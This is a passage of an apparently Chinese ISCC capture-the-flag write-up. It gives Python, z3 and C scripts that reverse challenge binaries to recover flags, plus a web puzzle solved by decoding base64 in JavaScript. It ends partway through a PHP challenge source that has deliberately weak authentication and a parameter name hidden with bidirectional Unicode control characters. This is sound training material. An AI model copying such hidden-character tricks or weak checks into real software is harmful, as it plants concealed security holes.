<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">v8 = [<span class="number">23</span>,<span class="number">68</span>,<span class="number">68</span>,<span class="number">15</span>,<span class="number">94</span>,<span class="number">10</span>,<span class="number">8</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">95</span>,<span class="number">8</span>,<span class="number">24</span>,<span class="number">87</span>,<span class="number">3</span>,<span class="number">26</span>]</span><br><span class="line">v7 = [<span class="number">73</span>,<span class="number">83</span>,<span class="number">67</span>,<span class="number">67</span>]</span><br><span class="line">v4 = <span class="number">0</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">15</span>):</span><br><span class="line">  v8[m] = v7[<span class="number">0</span>] ^ v8[m] </span><br><span class="line">  v8[m] -= v7[m % <span class="number">4</span>] % <span class="number">5</span></span><br><span class="line">  v8[m] = v8[m] + v7[<span class="number">2</span>] % <span class="number">6</span> + v7[<span class="number">3</span>] // <span class="number">6</span></span><br><span class="line">  v8[m] -=  v7[<span class="number">1</span>] // <span class="number">7</span> + v7[<span class="number">0</span>] % <span class="number">7</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">15</span>):</span><br><span class="line">   v8[k] -= k</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>,<span class="number">0</span>):</span><br><span class="line">   v8[j] = v8[j-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">15</span>):</span><br><span class="line">   v8[i] += <span class="number">60</span></span><br><span class="line">   flag += <span class="built_in">chr</span>(v8[i])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;I&quot;</span>+flag)</span><br></pre></td></tr></table></figure>

<p>得到flag：ISCC{Just<del>Do</del>It}</p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-03%20205707.png"></p>
<h3 id="奇门遁甲"><a href="#奇门遁甲" class="headerlink" title="奇门遁甲"></a>奇门遁甲</h3><p>查壳，无壳，32位</p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/image-20230509195901877.png" alt="image-20230509195901877"></p>
<p>直接打开exe，发现是开门，随便选一个生门</p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-09%20200557.png"></p>
<p>获得碎片，现在还不清楚是什么，就继续选3</p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-09%20200602.png"></p>
<p>好像错了，猜测可能是连续走门获得碎片。</p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/image-20230509200822985.png" alt="image-20230509200822985"></p>
<p>ida打开exe，f5反编译main，发现switch函数的case：1-7和default，正好与8门对应，而第一次输入3，才能成功，case：3中的if判断v3&#x3D;1，而初始v3&#x3D;0，然后v3++，到switch函数时v3&#x3D;1。那么大概解题就是按顺序输入正确的数字。</p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/image-20230509202248506.png" alt="image-20230509202248506"></p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/image-20230509202157492.png" alt="image-20230509202157492"></p>
<p>打开case的函数，点击byte，找到碎片</p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-09%20202412.png" alt="屏幕截图 2023-05-09 202412"></p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-09%20202420.png"></p>
<p>按照这样找到所有的8个碎片，按顺序拼接得到flag</p>
<p>?48?IKuSzv;UZrzWTLLuV8VG</p>
<h3 id="变形记"><a href="#变形记" class="headerlink" title="变形记"></a>变形记</h3><p>下载exe，查壳，发现无壳，32位</p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/image-20230514191304576.png" alt="image-20230514191304576">                    </p>
<p>找到main函数，发现一串字符串</p>
<p>&#x3D;&#x3D;wcWl3cCp3cCNXVzMnd5JzcjF2c</p>
<p>将它倒过来进行base64解密，sacs2yvs3UsBszBsyVs</p>
<p>但是它并不对，再回头看看代码</p>
<p>写一个脚本解密</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"></span><br><span class="line">secret = <span class="string">&quot;==wcWl3cCp3cCNXVzMnd5JzcjF2c&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join([(v) <span class="keyword">if</span> v.isdigit() == <span class="literal">False</span> <span class="keyword">else</span> ((b64decode(secret[::-<span class="number">1</span>].encode()).decode()[i-<span class="number">1</span>])*(<span class="built_in">int</span>(v)-<span class="number">1</span>))</span><br><span class="line"> <span class="keyword">for</span>  i,v <span class="keyword">in</span> <span class="built_in">enumerate</span>(b64decode(secret[::-<span class="number">1</span>].encode()).decode())]))</span><br></pre></td></tr></table></figure>

<p>得到，sacssyvsssUsBszBsyVs</p>
<p>Flag：ISCC{ sacssyvsssUsBszBsyVs }</p>
<p>脚本的作用：解码一个使用base64编码的秘密消息。编码后的消息存储在变量’secret’中。如果字符不是数字，则将其添加到一个新的字符串中。如果它是数字，则代码获取解码后消息中的前一个字符并将其重复(int(v)-1)次。然后，重复的字符被添加到新字符串中</p>
<h3 id="Convert"><a href="#Convert" class="headerlink" title="Convert"></a>Convert</h3><p>ida反汇编，进入main函数</p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/image-20230524202718713.png" alt="image-20230524202718713"></p>
<p>发现关键函数sub_488B0A进入，分析函数</p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/image-20230524202703429.png" alt="image-20230524202703429"></p>
<p>编写解题脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">data = [<span class="number">40</span> ,<span class="number">48</span> ,<span class="number">36</span> ,<span class="number">36</span>, <span class="number">98</span>,<span class="number">28</span>,<span class="number">33</span>,<span class="number">59</span>,<span class="number">53</span>,<span class="number">42</span>,<span class="number">31</span>,<span class="number">18</span>,-<span class="number">104</span>,<span class="number">78</span>,<span class="number">79</span>,<span class="number">88</span>,<span class="number">49</span>,<span class="number">49</span>,<span class="number">88</span>,<span class="number">84</span>,<span class="number">21</span>,<span class="number">56</span> ,<span class="number">115</span>] </span><br><span class="line">x = [BitVec(<span class="string">&quot;x[%d]&quot;</span> % i, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">23</span>)]</span><br><span class="line">key = [<span class="built_in">ord</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&quot;ISCC&quot;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">23</span>):</span><br><span class="line">    x[i] -= <span class="number">32</span></span><br><span class="line">    x[i] += i</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    x[j] += j ^ -(key[j] % <span class="number">4</span>)</span><br><span class="line">    x[j + <span class="number">4</span>] += key[j] % <span class="number">5</span></span><br><span class="line">    x[j + <span class="number">8</span>] += <span class="number">2</span> * j</span><br><span class="line">    x[j + <span class="number">12</span>] += x[j + <span class="number">4</span>]</span><br><span class="line">    x[j + <span class="number">16</span>] += key[j] / <span class="number">5</span></span><br><span class="line">S = Solver()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">23</span>):</span><br><span class="line">    S.add(x[i] == data[i])</span><br><span class="line">    S.check()</span><br><span class="line"><span class="built_in">print</span>(S.model())</span><br><span class="line"></span><br><span class="line">x[<span class="number">9</span>] = <span class="number">63</span></span><br><span class="line">x[<span class="number">14</span>] = <span class="number">64</span></span><br><span class="line">x[<span class="number">17</span>] = <span class="number">48</span></span><br><span class="line">x[<span class="number">8</span>] = <span class="number">77</span></span><br><span class="line">x[<span class="number">22</span>] = <span class="number">125</span></span><br><span class="line">x[<span class="number">2</span>] = <span class="number">67</span></span><br><span class="line">x[<span class="number">7</span>] = <span class="number">82</span></span><br><span class="line">x[<span class="number">21</span>] = <span class="number">67</span></span><br><span class="line">x[<span class="number">18</span>] = <span class="number">89</span></span><br><span class="line">x[<span class="number">20</span>] = <span class="number">33</span></span><br><span class="line">x[<span class="number">12</span>] = <span class="number">74</span></span><br><span class="line">x[<span class="number">1</span>] = <span class="number">83</span></span><br><span class="line">x[<span class="number">5</span>] = <span class="number">52</span></span><br><span class="line">x[<span class="number">4</span>] = <span class="number">123</span></span><br><span class="line">x[<span class="number">11</span>] = <span class="number">33</span></span><br><span class="line">x[<span class="number">6</span>] = <span class="number">57</span></span><br><span class="line">x[<span class="number">3</span>] = <span class="number">67</span></span><br><span class="line">x[<span class="number">13</span>] = <span class="number">69</span></span><br><span class="line">x[<span class="number">10</span>] = <span class="number">49</span></span><br><span class="line">x[<span class="number">15</span>] = <span class="number">46</span></span><br><span class="line">x[<span class="number">19</span>] = <span class="number">84</span></span><br><span class="line">x[<span class="number">0</span>] = <span class="number">73</span></span><br><span class="line">x[<span class="number">16</span>] = <span class="number">51</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> x:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>运行得到flag &#x3D; ISCC{49RM?1!JE@.30YT!C}</p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/image-20230524203347415.png" alt="image-20230524203347415"></p>
<h3 id="Congratulations"><a href="#Congratulations" class="headerlink" title="Congratulations"></a>Congratulations</h3><p>ida反汇编，进入main函数</p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/image-20230524203916035.png" alt="image-20230524203916035"></p>
<p>进入sub_488D5D，可以看到该函数为凯撒位移为一的解密</p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/image-20230524203854855.png" alt="image-20230524203854855"></p>
<p>进入sub_489410，分析代码，写出解题脚本</p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/image-20230524203832481.png" alt="image-20230524203832481"></p>
<p>运行后获得的字符串HRBB{AZ.R+z&#x2F;I*:U7\h6LWB6!}，进行凯撒位移为一的加密，得flag&#x3D;ISCC{BA.S+a&#x2F;J:V7\i6MXC6!}</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">  <span class="type">char</span> v9[<span class="number">26</span>];</span><br><span class="line">  <span class="type">char</span> a2[<span class="number">4</span>]=<span class="string">&quot;ISCC&quot;</span>;</span><br><span class="line">  v9[<span class="number">0</span>] = <span class="number">-91</span>;</span><br><span class="line">  v9[<span class="number">1</span>] = <span class="number">67</span>;</span><br><span class="line">  v9[<span class="number">2</span>] = <span class="number">83</span>;</span><br><span class="line">  v9[<span class="number">3</span>] = <span class="number">-108</span>;</span><br><span class="line">  v9[<span class="number">4</span>] = <span class="number">105</span>;</span><br><span class="line">  v9[<span class="number">5</span>] = <span class="number">-76</span>;</span><br><span class="line">  v9[<span class="number">6</span>] = <span class="number">127</span>;</span><br><span class="line">  v9[<span class="number">7</span>] = <span class="number">-113</span>;</span><br><span class="line">  v9[<span class="number">8</span>] = <span class="number">116</span>;</span><br><span class="line">  v9[<span class="number">9</span>] = <span class="number">-30</span>;</span><br><span class="line">  v9[<span class="number">10</span>] = <span class="number">24</span>;</span><br><span class="line">  v9[<span class="number">11</span>] = <span class="number">-75</span>;</span><br><span class="line">  v9[<span class="number">12</span>] = <span class="number">76</span>;</span><br><span class="line">  v9[<span class="number">13</span>] = <span class="number">-93</span>;</span><br><span class="line">  v9[<span class="number">14</span>] = <span class="number">-74</span>;</span><br><span class="line">  v9[<span class="number">15</span>] = <span class="number">77</span>;</span><br><span class="line">  v9[<span class="number">16</span>] = <span class="number">-120</span>;</span><br><span class="line">  v9[<span class="number">17</span>] = <span class="number">-89</span>;</span><br><span class="line">  v9[<span class="number">18</span>] = <span class="number">97</span>;</span><br><span class="line">  v9[<span class="number">19</span>] = <span class="number">-71</span>;</span><br><span class="line">  v9[<span class="number">20</span>] = <span class="number">-90</span>;</span><br><span class="line">  v9[<span class="number">21</span>] = <span class="number">70</span>;</span><br><span class="line">  v9[<span class="number">22</span>] = <span class="number">95</span>;</span><br><span class="line">  v9[<span class="number">23</span>] = <span class="number">70</span>;</span><br><span class="line">  v9[<span class="number">24</span>] = <span class="number">-9</span>;</span><br><span class="line">  v9[<span class="number">25</span>] = <span class="number">95</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; ; ++k )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( k &gt;= <span class="number">25</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v9[k] ^= a2[<span class="number">1</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">24</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">        v9[i]+=v9[i+<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">26</span>; ++i )</span><br><span class="line">    v9[i] += <span class="number">30</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">26</span>; ++i )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,v9[i]);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/image-20230524204559276.png" alt="image-20230524204559276"></p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/image-20230524204620534.png" alt="image-20230524204620534"></p>
<h3 id="狂飙1"><a href="#狂飙1" class="headerlink" title="狂飙1"></a>狂飙1</h3><p>编写解题脚本，mod为附件序列号29</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mod = <span class="number">29</span> </span><br><span class="line">a1 = <span class="number">0x50d7c32f4a659</span></span><br><span class="line">a2 =<span class="string">&quot;4-chloroisatin&quot;</span></span><br><span class="line">a3 =<span class="string">&quot;Ammosamide B&quot;</span></span><br><span class="line">mod_out = (<span class="built_in">int</span>((a1 % <span class="number">100000</span>) % mod)) ^ (mod * (<span class="built_in">int</span>)(a1 % <span class="number">100000</span>))</span><br><span class="line">flag = <span class="string">&quot;ISCC&#123;&quot;</span> + <span class="built_in">str</span>(mod_out) + <span class="string">&quot;_&quot;</span> + a2 + <span class="string">&quot;_&quot;</span> + <span class="built_in">str</span>(a1) + <span class="string">&quot;_&quot;</span> +a3 + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<p>ISCC{1543983_4-chloroisatin_1422201965553241_Ammosamide B}</p>
<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="羊了个羊"><a href="#羊了个羊" class="headerlink" title="羊了个羊"></a>羊了个羊</h3><p>进入网站是网页小游戏</p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-03%20211252.png"></p>
<p>查看网页源码，查看js文件，ctrl+f，打开搜索，搜索flag，ISCC或成功都没有找到，最后搜索通，找到被base64加密的flag</p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-03%20210855.png"></p>
<p>两次base64解密得到ISCC{J31oX5ze04dQWktH2hj64ZO3YCSbLa6f}</p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/image-20230503211723103.png" alt="image-20230503211723103"></p>
<h3 id="小周的密码锁"><a href="#小周的密码锁" class="headerlink" title="小周的密码锁"></a>小周的密码锁</h3><p>随便输个密码，发现密钥错误。</p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/image-20230523204329100.png" alt="image-20230523204329100"></p>
<p>pwd2&#x3D;5得到源码，代码审计</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">MyHashCode</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$h</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$len</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$hash</span> = <span class="title function_ invoke__">intval40</span>(<span class="title function_ invoke__">intval40</span>(<span class="number">40</span> * <span class="variable">$hash</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$i</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">abs</span>(<span class="variable">$hash</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">intval40</span>(<span class="params"><span class="variable">$code</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$falg</span> = <span class="variable">$code</span> &gt;&gt; <span class="number">32</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$falg</span> == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="variable">$code</span> = ~(<span class="variable">$code</span> - <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$code</span> * -<span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Checked</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$p1</span> = <span class="string">&#x27;/ISCC/&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$p1</span>, <span class="variable">$str</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">SecurityCheck</span>(<span class="params"><span class="variable">$sha1</span>,<span class="variable">$sha2</span>,<span class="variable">$user</span></span>)</span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$p1</span> = <span class="string">&#x27;/^[a-z]+$/&#x27;</span>;</span><br><span class="line">        <span class="variable">$p2</span> = <span class="string">&#x27;/^[A-Z]+$/&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$p1</span>, <span class="variable">$sha1</span>) &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="variable">$p2</span>, <span class="variable">$sha2</span>))&#123;</span><br><span class="line">            <span class="variable">$sha1</span> = <span class="title function_ invoke__">strtoupper</span>(<span class="variable">$sha1</span>);</span><br><span class="line">            <span class="variable">$sha2</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$sha2</span>);</span><br><span class="line">            <span class="variable">$user</span> = <span class="title function_ invoke__">strtoupper</span>(<span class="variable">$user</span>);</span><br><span class="line">            <span class="variable">$crypto</span> = <span class="variable">$sha1</span> ^ <span class="variable">$sha2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;wrong&quot;</span>);</span><br><span class="line">        &#125;       </span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="variable">$crypto</span>, <span class="variable">$user</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];<span class="comment">//user</span></span><br><span class="line">    <span class="variable">$sha1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;sha1&#x27;</span>];<span class="comment">//sha1</span></span><br><span class="line">    <span class="variable">$sha2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;‮⁦//sha2⁩⁦sha2&#x27;</span>];</span><br><span class="line">    <span class="comment">//‮⁦see me ⁩⁦can you </span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;password2&#x27;</span>] == <span class="number">5</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">//Try to encrypt</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$sha1</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$sha2</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$user</span>))&#123;</span><br><span class="line">                [<span class="variable">$crypto</span>, <span class="variable">$user</span>] = <span class="title function_ invoke__">SecurityCheck</span>(<span class="variable">$sha1</span>,<span class="variable">$sha2</span>,<span class="variable">$user</span>);</span><br><span class="line">                <span class="keyword">if</span>((<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$crypto</span>),-<span class="number">6</span>,<span class="number">6</span>) === <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$user</span>),-<span class="number">6</span>,<span class="number">6</span>)) &amp;&amp; (<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$user</span>),-<span class="number">6</span>,<span class="number">6</span>)) === <span class="string">&#x27;a05c53&#x27;</span>)&#123;<span class="comment">//welcome to ISCC</span></span><br><span class="line">                    </span><br><span class="line">                    <span class="keyword">if</span>((<span class="title function_ invoke__">MyHashcode</span>(<span class="string">&quot;ISCCNOTHARD&quot;</span>) === <span class="title function_ invoke__">MyHashcode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]))&amp;&amp;<span class="title function_ invoke__">Checked</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">                        <span class="keyword">include</span>(<span class="string">&quot;f1ag.php&quot;</span>);</span><br><span class="line">                        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;就快解开了!&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    </span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&quot;真的想不起来密码了吗?&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span 